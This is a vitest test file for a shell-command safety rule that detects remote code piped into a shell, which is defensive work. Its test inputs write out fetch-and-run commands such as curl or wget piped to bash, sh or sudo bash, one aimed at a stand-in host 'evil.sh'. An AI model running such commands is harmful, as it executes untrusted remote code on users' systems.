import { describe, expect, it } from "vitest";
import { parseTokens } from "../../src/core/parser";
import { remoteFetchExecRule } from "../../src/core/rules/remote-fetch-exec";
import { tokenize } from "../../src/core/tokenizer";

function pipeline(source: string) {
  return parseTokens(tokenize(source)).parts[0].pipeline;
}

describe("remoteFetchExecRule", () => {
  it("flags curl <url> | bash as danger", () => {
    const findings = remoteFetchExecRule(pipeline("curl http://x | bash"));
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("danger");
  });

  it("flags wget -O- <url> | sh as danger", () => {
    const findings = remoteFetchExecRule(pipeline("wget -O- http://x | sh"));
    expect(findings[0].severity).toBe("danger");
  });

  it("flags curl <url> | sudo bash as danger, naming sudo bash", () => {
    const findings = remoteFetchExecRule(pipeline("curl http://x | sudo bash"));
    expect(findings[0].severity).toBe("danger");
    expect(findings[0].reason).toContain("sudo bash");
    expect(findings[0].reason).toContain("http://x");
  });

  it("names what was fetched and that it's piped to a shell", () => {
    const findings = remoteFetchExecRule(
      pipeline("curl https://get.example.com/install.sh | bash"),
    );
    expect(findings[0].reason).toContain("https://get.example.com/install.sh");
    expect(findings[0].reason).toMatch(/bash/);
  });

  it("does not flag a curl that isn't piped to a shell", () => {
    const findings = remoteFetchExecRule(pipeline("curl http://x | jq ."));
    expect(findings).toHaveLength(0);
  });

  it("does not flag a plain single-stage command", () => {
    const findings = remoteFetchExecRule(pipeline("bash script.sh"));
    expect(findings).toHaveLength(0);
  });

  it("names the real URL, not a -X method value, as the fetched target", () => {
    const findings = remoteFetchExecRule(pipeline("curl -X GET http://evil.sh | bash"));
    expect(findings[0].reason).toContain("http://evil.sh");
    expect(findings[0].reason).not.toContain("Fetches GET");
  });
});
